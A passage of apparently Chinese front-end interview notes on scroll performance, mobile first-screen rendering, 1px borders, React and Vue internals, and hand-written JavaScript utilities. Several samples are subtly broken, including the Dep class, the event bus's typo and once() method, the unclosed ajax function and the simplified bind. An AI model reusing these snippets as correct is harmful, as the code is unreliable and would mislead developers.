**window.requestAnimationFrame()**这个方法是用来在页面重绘之前，通知浏览器调用一个指定的函数。这个方法接受一个函数为参，该函数会在重绘前调用。

使用 requestAnimationFrame 来触发滚动事件，相当于上面的：

throttle(func, xx, 1000/60) //xx 代表 xx ms内不会重复触发事件 handler

* rAF：16.7ms 触发一次 handler，降低了可控性，但是提升了性能和精确度。


**3.滑动过程中尝试使用 pointer-events: none 禁止鼠标事件**

是禁止鼠标行为，应用了该属性后，譬如鼠标点击，hover 等功能都将失效，即是元素不会成为鼠标事件的 target。

pointer-events: none 可用来提高滚动时的帧频。的确，当滚动时，鼠标悬停在某些元素上，则触发其上的 hover 效果，然而这些影响通常不被用户注意，并多半导致滚动出现问题。对 body 元素应用 pointer-events: none ，禁用了包括 hover 在内的鼠标事件，从而提高滚动性能。

做法就是在页面滚动的时候, 给 <body> 添加上 .disable-hover 样式，那么在滚动停止之前, 所有鼠标事件都将被禁止。当滚动结束之后，再移除该属性。

### 8、**如何做到一秒渲染一个移动页面**

一个网页是否可以在移动环境下用不到一秒的时间完成渲染，是一项非常重要的性能指标。研究显示，任何超过一秒钟的延迟都将打断用户的思维顺流状态，带来较差的体验。我们的目标是不论在任何设备或网络条件下，都要维持用户在网页中的沉浸状态，提供更好的体验。

想要达到这个标准并不是那么容易。不过幸运的是，我们并不需要在这个时间指标内渲染出整个页面，而是**要在一秒以内传输并渲染出**“**首屏内容**”**（ATF），让用户尽快与页面交互**。接下来，当用户与首屏内容进行交互的同时，页面的剩余部分可以在后台持续加载完成。

1.**适应高延迟的移动网络**

在移动设备上达到“首屏秒开”的准则，需要面对其它网络所遇不到的独特挑战。用户可能正通过 2G、3G 或 4G 等各种各样的网络来访问你的网站。移动网络的延迟要明显高于有线连接，并且将消耗我们“首屏秒开”预算中的一大部分：

* 200-300 ms roundtrip times for 3G networks
* 50-100 ms roundtrip times for 4G networks
* 3G 网络的往返时间将消耗 200-300 ms
* 4G 网络的往返时间将消耗 50-100 ms

明白了这一点之后，我们来倒推一下时间。如果我们来分析一下浏览器与服务器之间一次典型的通信过程，会发现 600 ms 的时间就已经被网络本身消耗掉了：一次 DNS 查询用于将主机名（比如 google.com）解析为 IP 地址，一次网络往返用于发起 TCP 握手，以及最后一次完整的网络往返用于发送 HTTP 请求。我们就只剩下 400 ms 了！

![图片](https://uploader.shimo.im/f/wKJz4aqoFUvsxijs.png!thumbnail?fileGuid=6vX3hWyqpyWTRwHj)

**一秒渲染一个移动页面**

* DNS Lookup (200 ms)
* TCP Connection (200 ms)
* HTTP Request and Response (200 ms)
* DNS 查询 (200 ms)
* TCP 连接 (200 ms)
* HTTP 请求与响应 (200 ms)

这 600 ms 是不可避免的 3G 网络消耗，你对此无能为力。

* Server Response Time (200 ms)
* Client-Side Rendering (200 ms)
* 服务器响应时间 (200 ms)
* 客户端渲染 (200 ms)

这 400 ms 是你可以优化的，只要你合理地更新你的服务器，并以适当的方式构建你的页面。

2.**实现半秒渲染的体验**

在除去网络延迟之后，我们的预算只剩下区区 400 ms 了，但我们仍然还有大量的工作要做：服务器必须渲染出响应内容，客户端应用程序代码必须执行，而且浏览器必须完成内容的布局和渲染。了解了这些之后，下面这些准则将帮助我们控制住预算：

(**1**)**服务器必须在 200 ms 以内渲染出响应内容**

服务器响应时间就是在除去网络传输时间之后，一台服务器首先返回 HTML 所花费的时间。因为我们剩下的时间实在太少了，这个时间应该控制在最低限度——理想情况下应该**低于 200 ms**，而且越少越好！

(**2**)**重定向的次数应该减至最少**

额外的 HTTP 重定向会增加一次或两次额外的网络往返（如果需要再次查询 DNS 的话就是两次），这在 3G 网络上将导致几百毫秒的额外延迟。因此，我们强烈建议网站管理员们**减少重定向的次数**，而且最好完全消除重定向——这对 HTML 文档来说尤其重要（尽可能避免重定向到 “m.” 二级域名的行为）。

(**3**)**首次渲染所需的网络往返次数应该减至最少**

由于 TCP 在评估连接状况方面采用了一套特殊机制（参见[TCP 慢启动](http://en.wikipedia.org/wiki/Slow-start?fileGuid=6vX3hWyqpyWTRwHj)），一次全新的 TCP 连接无法立即用满客户端和服务器之间的全部有效带宽。在这种情况下，服务器在首次网络往返中，通过一个新连接（约 14kB）只能发送最多 10 个 TCP 包，接下来它必须等待客户端应答这些数据，然后才能增加它的拥塞窗口并继续发送更多数据。

考虑到 TCP 的这种行为，优化你的内容就显得十分重要。传输必要数据、完成页面首次渲染所需的网络往返次数应该减至最少。**理想情况下，首屏内容应该小于 14KB——这样浏览器才能在一次网络往返之后就可以绘制页面。**同时，还有一个关键点需要留意，10 个数据包上限（[IW10](http://tools.ietf.org/html/draft-hkchu-tcpm-initcwnd-01?fileGuid=6vX3hWyqpyWTRwHj)）源自 TCP 标准的最近一次更新：你应该确保你的服务器软件已经升级到最新版本，以便从这次更新中获益。否则，这个上限将可能降到 3～4 个数据包。

(**4**)**避免在首屏内容中出现外链的阻塞式 JavaScript 和 CSS**

浏览器必须先解析页面，然后才能向用户渲染这个页面。如果它在解析期间遇到一个非异步的或具有阻塞作用的外部脚本的话，它就不得不停下来，然后去下载这个资源。每次遇到这种情况，都会增加一次网络往返，这将延后页面的首次渲染时间。

**结论就是，首屏渲染所需的 JavaScript 和 CSS 应该内嵌到页面中，而用于提供附加功能的 JavaScript 和 CSS 应该在首屏内容已经传输完成之后再加载。**

(**5**)**为浏览器的布局和渲染工作预留时间**(**200 ms**)

解析 HTML 和 CSS、执行 JavaScript 的过程也将消耗时间和客户端资源！取决于移动设备的速度和页面的复杂度，这个过程将占用几百毫秒。我们的建议是**预留 200 ms 作为浏览器的时间消耗。**

(**6**)**优化 JavaScript 执行和渲染耗时**

执行复杂的脚本和低效的代码可能会耗费几十或上百毫秒——可以使用浏览器内建的开发者工具来收集概况、优化代码。

### 9 1px 问题

* 物理像素

物理像素又称**设备像素**，是组成显示屏的基本单位，每一台设备的物理像素在出厂时就已经固定好了，不会改变，我们平时看到的图片是通过每个像素不同颜色组合而成的。

设计师一般要求的像素就是物理像素。

* 逻辑像素

逻辑像素又称为**设备独立像素**或**CSS像素**，是组成图像的基本单位，它是一个抽象概念，我们可以笼统的认为屏幕可视区域的宽度就是逻辑像素的大小。在1倍屏下，1倍逻辑像素=1倍物理像素；2倍屏下，1倍逻辑像素=2倍物理像素。逻辑像素是可变的，例如当我们放大页面的尺寸比例时，逻辑像素也就随之扩大。

前端开发者在CSS中设置的像素就是逻辑像素。

* 设备像素比

设备像素比描述的是物理像素和逻辑像素之间的比例关系。

设备像素比 = 物理像素 / 逻辑像素。

怎么获取DPR？

`window.devicePixelRatio`或`@media screen and (-webkit-min-device-pixel-ratio: 2) {}`

* PPI

PPI指的是设备每英寸的物理像素点，说的简单点就是一英寸的屏幕中由多少个物理像素组合而成。

**解决方案**

CSS媒体查询方案

```css
.div {
  border-width: 1px;
}
/* 两倍像素下 */
@media screen and (-webkit-min-device-pixel-ratio: 2) {
  .div {
    border-width: 0.5px;
  }
}
/* 三倍像素下 */
@media screen and (-webkit-min-device-pixel-ratio: 3) {
  .div {
    border-width: 0.333333px;
  }
}
```
transform + 伪类
```css
@media (-webkit-min-device-pixel-ratio:2),(min-device-pixel-ratio:2){
  .border-bt-1px{
    position: relative;
    :before{
      content: '';
      position: absolute;
      left:0;           
      bottom: 0;
      width: 100%;
      height: 1px;
      background: #ee2c2c;
      transform: scaleY(0.5);
    }
  }
}
```
box-shadow
```css
.div {
  box-shadow: inset 0px -1px 1px -1px #c8c7cc;
}
```
## 八.React Vue 框架相关

### **1 react setState  是否是异步执行的？**

在 React 的 setState 函数实现中，会根据一个变量 isBatchingUpdates 判断是直接更新 this.state 还是放到队列中回头再说，而 isBatchingUpdates 默认是 false，也就表示 setState 会同步更新 this.state，但是，有一个函数 batchedUpdates，这个函数会把 isBatchingUpdates 修改为 true，而当 React 在调用事件处理函数之前就会调用这个 batchedUpdates，造成的后果，就是由 React 控制的事件处理过程 setState 不会同步更新 this.state。

由**React**控制的事件处理过程**setState**不会同步更新**this.state**

在**React**控制之外的情况，**setState**会同步更新**this.state**

绕过 React 通过 JavaScript 原生 addEventListener 直接添加的事件处理函数，还有使用 setTimeout/setInterval 等 React 无法掌控的 APIs情况下，就会出现同步更新 state 的情况

### 2 Vue 响应式原理，双向绑定，Vue3 响应式？，与 react 区别

Vue 是利用的`Object.defineProperty()`方法进行的数据劫持，利用 setter、getter 来检测数据的读写。

因此，流程大概是这样的：

1. 实现一个监听器 Observer，用来劫持并监听所有属性，如果发生变动，则通知订阅者。
2. 实现一个订阅者 Watcher，当接到属性变化的通知时，执行对应的函数，然后更新视图，使用 Dep 来收集这些 Watcher。
3. 实现一个解析器 Compile，用于扫描和解析的节点的相关指令，并根据初始化模板以及初始化相应的订阅器。

![图片](https://uploader.shimo.im/f/jOCHvqIjas66Z5lb.png!thumbnail?fileGuid=6vX3hWyqpyWTRwHj)

```javascript
// 为数据添加检测
function defineReactive(data, key, val) {
  observe(val); // 递归遍历所有子属性
  let dep = new Dep(); // 新建一个dep
  Object.defineProperty(data, key, {
    enumerable: true,
    configurable: true,
    get: function() {
      if (Dep.target) {
        // 判断是否需要添加订阅者，仅第一次需要添加，之后就不用了，详细看Watcher函数
        dep.addSub(Dep.target); // 添加一个订阅者
      }
      return val;
    },
    set: function(newVal) {
      if (val == newVal) return; // 如果值未发生改变就return
      val = newVal;
      console.log(
        "属性" + key + "已经被监听了，现在值为：“" + newVal.toString() + "”"
      );
      dep.notify(); // 如果数据发生变化，就通知所有的订阅者。
    },
  });
}
```
* Observer

是一个数据监听器，核心方法是利用`Object.defineProperty()`通过递归的方式对所有属性都添加 setter、getter 方法进行监听。

```javascript
// 监听对象的所有属性
function observe(data) {
  if (!data || typeof data !== "object") {
    return; // 如果不是对象就return
  }
  Object.keys(data).forEach(function(key) {
    defineReactive(data, key, data[key]);
  });
}
// Dep 负责收集订阅者，当属性发生变化时，触发更新函数。
function Dep() {
  this.subs = {};
}
Dep.prototype = {
  addSub: function(sub) {
    this.subs.push(sub);
  },
  notify: function() {
    this.subs.forEach((sub) => sub.update());
  },
};
```
* watcher

订阅者 Watcher 需要在初始化的时候将自己添加到订阅器 Dep 中，我们已经知道监听器 Observer 是在 get 时执行的 Watcher 操作，所以只需要在 Watcher 初始化的时候触发对应的 get 函数去添加对应的订阅者操作即可。

那给如何触发 get 呢？因为我们已经设置了 Object.defineProperty()，所以只需要获取对应的属性值就可以触发了。

我们只需要在订阅者 Watcher 初始化的时候，在 Dep.target 上缓存下订阅者，添加成功之后在将其去掉就可以了。

```javascript
function Watcher(vm, exp, cb) {
  this.cb = cb;
  this.vm = vm;
  this.exp = exp;
  this.value = this.get(); // 将自己添加到订阅器的操作
}
Watcher.prototype = {
  update: function() {
    this.run();
  },
  run: function() {
    var value = this.vm.data[this.exp];
    var oldVal = this.value;
    if (value !== oldVal) {
      this.value = value;
      this.cb.call(this.vm, value, oldVal);
    }
  },
  get: function() {
    Dep.target = this; // 缓存自己，用于判断是否添加watcher。
    var value = this.vm.data[this.exp]; // 强制执行监听器里的get函数
    Dep.target = null; // 释放自己
    return value;
  },
};
```

### 4 Vue 3 新特性 与 Vue 2有什么区别

|Vue2|Vue3|
|:----|:----|
|响应式：Object.defineProperty|Proxy|

常见问题：

* watch 与 computed 的区别
* vue生命周期及对应的行为
* vue父子组件生命周期执行顺序
* 组件间通讯方法
* 如何实现一个指令
* vue.nextTick实现原理
* diff算法
* 如何做到的双向绑定
* 虚拟dom为什么快
* 如何设计一个组件

react 与 vue 区别

相同：

数据驱动页面，提供响应式组件；都有virtural dom；支持ssr；都有支持native瘦的

不同：

数据绑定 vue 双向，react 单向数据流；react jsx，vue vue模板；

### 5 react diff 策略

* tree diff React 对树的算法进行了简洁明了的优化，即对树进行分层比较，两棵树只会对同一层次的节点进行比较。
* component diff 对于同一类型的组件，有可能其 Virtual DOM 没有任何变化，如果能够确切的知道这点那可以节省大量的 diff 运算时间，因此 React 允许用户通过 shouldComponentUpdate() 来判断该组件是否需要进行 diff。
* element diff ：允许开发者对同一层级的同组子节点，添加唯一 key 进行区分，虽然只是小小的改动，性能上却发生了翻天覆地的变化

**fiber**

React Fiber是react执行渲染时的一种新的调度策略，JavaScript是单线程的，一旦组件开始更新，主线程就一直被React控制，这个时候如果再次执行交互操作，就会卡顿。

React Fiber重构这种方式，渲染过程采用切片的方式，每执行一会儿，就歇一会儿。如果有优先级更高的任务到来以后呢，就会先去执行，降低页面发生卡顿的可能性，使得React对动画等实时性要求较高的场景体验更好。

理论上人眼最高能识别的帧数不超过 30 帧，电影的帧数大多固定在 24，浏览器最优的帧率是 60，即16.5ms 左右渲染一次。 浏览器正常的工作流程应该是这样的，运算 -> 渲染 -> 运算 -> 渲染 -> 运算 -> 渲染 …

那么这个问题如何解决，这就是 fiber reconciler 要做的事了。简而言之可以看下图，将要执行的 JS 做拆分，保证不会阻塞主线程（Main thread）即可。

我们知道，任何的函数调用都会有自己的调用栈，比如对于 v = f(d) 这个函数来说，函数 f 可能又调用了一系列其它的函数，这些函数就包括在 f 的调用栈中。关键的问题在于，这种原生的调用栈是基本不可延迟的，它会立即执行，如果计算量很大的话就会阻塞住进程，让界面失去响应，这种事情经常发生在 React 的渲染过程中。所以这个时候就需要 fiber 这个东西，如果说 virtual dom 是对于实际 UI 的一种抽象的数据结构，那么 fiber 就是一种 virtual stack，它是对于调用栈的一种重新实现的数据抽象。每一个 fiber 就是一个计算单元，可以任意修改它的优先级，可以在任何时候让它执行。这样我们就拥有了调度计算的能力，比如在动画进行的时候停止其它大计算量的工作，直到动画结束再这些工作继续。

为什么JS长时间执行会影响交互响应、动画？

因为JavaScript在浏览器的主线程上运行，恰好与样式计算、布局以及许多情况下的绘制一起运行。如果JavaScript运行时间过长，就会阻塞这些其他工作，可能导致掉帧。

Fiber解决这个问题的思路是把渲染/更新过程（递归diff）拆分成一系列小任务，每次检查树上的一小部分，做完看是否还有时间继续下一个任务，有的话继续，没有的话把自己挂起，主线程不忙的时候再继续。增量更新需要更多的上下文信息，之前的vDOM tree显然难以满足，所以扩展出了fiber tree（即Fiber上下文的vDOM tree）

### 6 react 受控组件 和非受控组件

非受控组件: 非受控组件即组件的状态改变不受控制

受控组件: 其值由React控制的输入表单元素称为“受控组件”.在受控组件中，表单数据由 React 组件处理。如果让表单数据由 DOM 处理时，替代方案为使用非受控组件。

### 7 react 生命周期

原来的（v16前）的生命周期在推出 Fiber 之后就不合适了，因为如果要开启async rendering,在render 函数之前的所有函数都有可能被执行多次。其中包括：

* componentWillMount
* componentWillReceiveProps
* shouldComponentUpdate
* componentWillUpdate

禁止不能用比劝导开发者不要这样用的效果更好，所以除了shouldComponentUpdate，其他在render函数之前的所有函数（componentWillMount，componentWillReceiveProps，componentWillUpdate）都被getDerivedStateFromProps替代。

也就是用一个静态函数getDerivedStateFromProps来取代被deprecate的几个生命周期函数，就是强制开发者在render之前只做无副作用的操作，而且能做的操作局限在根据props和state决定新的state

注意：

1. getDerivedStateFromProps前面要加上static保留字，声明为静态方法，不然会被react忽略掉

2.getDerivedStateFromProps里面的this为undefined：static静态方法只能Class(构造函数)来调用(App.staticMethod✅)，而实例是不能的( (new App()).staticMethod ❌ )；

3.getSnapshotBeforeUpdate：***getSnapshotBeforeUpdate()***被调用于render之后，可以读取但无法使用DOM的时候。它使您的组件可以在可能更改之前从DOM捕获一些信息（例如滚动位置）。此生命周期返回的任何值都将作为参数传递给componentDidUpdate（）。



## 七.基础代码实现

### 1.js 深拷贝

```javascript
function deepCopy(src) {
    
    var result = src.constructor === Array ? [] : {};
    if (typeof src !== 'object') {
        return;
    } else {
        for (var i in src) {
            if (src.hasOwnProperty(i)) {
                result[i] = typeof src[i] === 'object' ? 
                    deepCopy(src[i]) : src[i] 
            }
        }
    }
    return result;
}
// 最快的拷贝方法 , 不能拷贝function / RegExp等类型，这会抛弃对象的constructor，变为object
var copy = JSON.parse(JSON.stringify(obj))
// 浅拷贝 ES6
var copy = Object.assign({}, obj);
// 数组，同样的，concat方法也只能保证一层深复制:
// 使用 [].concat 来复制数组
```
### 2.js 数组去重

```javascript
Array.from(new Set(replaceArr));
[...new Set(replaceArr)];
function unique(arr) {
    return arr.filter(function(item, index, array) {
        return array.indexOf(item) === index
    })
}

function arrayNoDupulate(array) {
    var hash = {};
    var result = [];
    for (var i = 0;i < array.length; i++) {
        if (!hash[array[i]]) {
            result.push(array[i]);
            hash[array[i]] = true;
        }
    }
    return result;
}
```
### 3.js 基本类型判断

```javascript
function checkVariable(variable){
	return Object.prototype.toString.call(variable).slice(8, -1).toLowerCase();
}
```
### 5.dfs / bfs

```javascript
function dfsTree(node) {
    if (!node) return;
    var result = [];    
    function dfs(ele) {
        let deep = arguments[1] || 1;
        result.push(ele.val);
        if (!ele.children.length) return;
        Array.from(ele.children).forEach(item => {
            dfs(item, deep+1);
        })  
    }
    dfs(node);
    return result;
}
```
```javascript
function bfsTree(node) {
  if (!node) return;
  var result = [];
  
  var queue = [{
    item: node,
    deep:1
  }]
  
  while(queue.length) {
    let ele = queue.shift();
    console.log(ele)
    result.push(ele.item.val);
    
    if(ele.item.children) {
      if (!ele.item.children.length) {
        continue;
      }
      Array.from(ele.item.children).forEach(it => {
        queue.push({
          item: it,
          deep: ele.deep + 1
        })
      })
    }
    
  }
  return result;
}
```
### 
### 6.封装一个 ajax 库实现 get 和 post 方法

```javascript
// 通用 promise 版
function ajax(options) {
    const { path, method, data } = options;
    return new Promise((resolve, reject) => {
        const request = new XMLHttpRequest();
        request.open(method, path);
        if (method.toLowerCase() === 'post') {
            request.setRequestHeader('Content-Type', "application/x-www-form-urlencoded;charset=UTF-8");
        } 
        request.send(data);
        request.onreadystatechange = () => {
            if (request.readyState === 4) {
                if (request.status >= 200 && request.status < 300) {
                    resolve.call(null, request.responseText);
                } else if (request.status >= 400) {
                    reject.call(null, request)
                }
            }
        }
    })
```
### 7.使用 promise.all 解决并发的情况

1. 初始化`limit`个Promise对象，作为`Promise.all`的参数
2. 每个Promise对象去`imageUrls`中取出一个url进行请求，若无则resolve
3. 每个Promise对象在当前请求成功后重复步骤2
```javascript
function fetchImageWithLimit(imageUrls, limit, handler ) {
  // copy一份，作为剩余url的记录
  let urls =[ ...imageUrls ]
  // 用来记录url - response 的映射
  // 保证输出列表与输入顺序一致
  let rs = new Map()
  // 递归的去取url进行请求
  function run() {
    if(urls.length > 0) {
      // 取一个，便少一个
      const url = urls.shift()
      // console.log(url, ' [start at] ', ( new Date()).getTime() % 10000)
      return handler(url).then(res => {
        // console.log(url, ' [end at] ', ( new Date()).getTime() % 10000)
        rs.set(url, res)
        return run()
      })
    }
  }
  // 当imageUrls.length < limit的时候，我们也没有必要去创建多余的Promise
  const promiseList = Array(Math.min(limit, imageUrls.length))
    // 这里用Array.protetype.fill做了简写，但不能进一步简写成.fill(run())
    .fill(Promise.resolve())
    .map(promise => promise.then(run))
    
  return Promise.all(promiseList).then(() => imageUrls.map(item => rs.get(item)))
}
```

普通代码实现

```javascript
function multiRequest(urls = [], maxNum) {
  // 请求总数量
  const len = urls.length;
  // 根据请求数量创建一个数组来保存请求的结果
  const result = new Array(len).fill(false);
  // 当前完成的数量
  let count = 0;
  return new Promise((resolve, reject) => {
    // 请求maxNum个
    while (count < maxNum) {
      next();
    }
    function next() {
      let current = count++;
      // 处理边界条件
      if (current >= len) {
        // 请求全部完成就将promise置为成功状态, 然后将result作为promise值返回
        !result.includes(false) && resolve(result);
        return;
      }
      const url = urls[current];
      console.log(`开始 ${current}`, new Date().toLocaleString());
      fetch(url)
        .then((res) => {
          // 保存请求结果
          result[current] = res;
          console.log(`完成 ${current}`, new Date().toLocaleString());
          // 请求没有全部完成, 就递归
          if (current < len) {
            next();
          }
        })
        .catch((err) => {
          console.log(`结束 ${current}`, new Date().toLocaleString());
          result[current] = err;
          // 请求没有全部完成, 就递归
          if (current < len) {
            next();
          }
        });
    }
  });
}
```

### 8.快速排序

```javascript
function quickSort(arr) {
    if (arr.length < 2) return arr;
    const middleEle = arr.splice(Math.floor(arr.length/2), 1);
    let left = [],
        right = [];
    for (let i = 0;i < arr.length;i++) {
        if (arr[i] < middleEle) {
            left.push(arr[i])
        } else {
            right.push(arr[i])
        }
    }
    return quickSort(left).concat(middleEle, quickSort(right));
}
```
### 9、函数节流，去抖动

* 节流(throttle):函数节流的目的，是为了限制函数一段时间内只能执行一次。因此，定时器实现节流函数通过使用定时任务，延时方法执行。在延时的时间内，方法若被触发，则直接退出方法。从而，实现函数一段时间内只执行一次。每隔一段时间后执行一次，也就是降低频率，将高频操作优化成低频操作，通常使用场景: 滚动条事件 或者 resize 事件，通常每隔 100~500 ms执行一次即可

**应用场景**

* 滚动加载，加载更多或滚到底部监听
* 谷歌搜索框，搜索联想功能
* 高频点击提交，表单重复提交
```javascript
function throttle(fn, delay) {
    var timer;
    return function () {
        var _this = this;
        var args = arguments;
        if (timer) {
            return;
        }
        timer = setTimeout(function () {
            fn.apply(_this, args);
            timer = null; // 在delay后执行完fn之后清空timer，此时timer为假，throttle触发可以进入计时器
        }, delay)
    }
}
```
* 防抖 (debounce):在事件被触发n秒后再执行回调，如果在这n秒内又被触发，则重新计时。
* 通常使用的场景是：
    * 搜索框搜索输入。只需用户最后一次输入完，再发送请求
    * 手机号、邮箱验证输入检测
    * 窗口大小Resize。只需窗口调整完成后，计算窗口大小。防止重复渲染。
```javascript
function debounce(fn, wait) {
    let timer = null
    return function(...args) {
        let context = this
     
        if (timer) clearTimeout(timer)
        timer = setTimeout(() => {
            fn.apply(context, args)
        }, wait)
    }
}
```
### 
### 10 手动实现 bind,call,apply

```javascript
Function.prototype.bind = function(context) {
    return () => this.call(context);
}
Function.prototype.myBind = function (context) {
  var _this = this
  var args = [...arguments].slice(1)
  // 返回一个函数
  return function F() {
    // 因为返回了一个函数，我们可以 new F()，所以需要判断
    if (this instanceof F) {
      return new _this(...args, ...arguments)
    }
    return _this.apply(context, args.concat(...arguments))
  }
```
* call
```javascript
Function.prototype.myCall = function(context, ...args) {
  context = context || window
  let fn = Symbol()
  context[fn] = this
  let result = context[fn](...args)
  delete context[fn]
  return result
}
```
* apply
```javascript
Function.prototype.myApply = function(context) {
  context = context || window
  let fn = Symbol()
  context[fn] = this
  let result
  if (arguments[1]) {
    result = context[fn](...arguments[1])
  } else {
    result = context[fn]()
  }
  delete context[fn]
  return result
}
```
### 11 事件总线

```javascript
var eventBus = {
  events: {},
  on: function(eventName, fn) {
    this.events[eventName] = this.events[eventName] || [];
    this.events[eventName].push(fn);
  },
  off: function(eventName, fn) {
    if (this.events[eventName]) {
      for(var i = 0;i < this.events[eventName].length;i++) {
        if (this.evnets[eventName][i] === fn) {
          this.events[eventName].splice(i, 1);
          break;
        }
      };
    }
  },
  emit: function(eventName, data) {
    if (this.events[eventName]) {
      this.events[eventName].forEach(function(fn) {
        fn(data);
      })
    }
  },
  once: function(eventName, fn) {
     var _this = this;
      var only = function() {
        fn.apply(_this, arguments);
        _this.off(eventName, fn);
      }
      _this.on(eventName, only);
      }
};
```

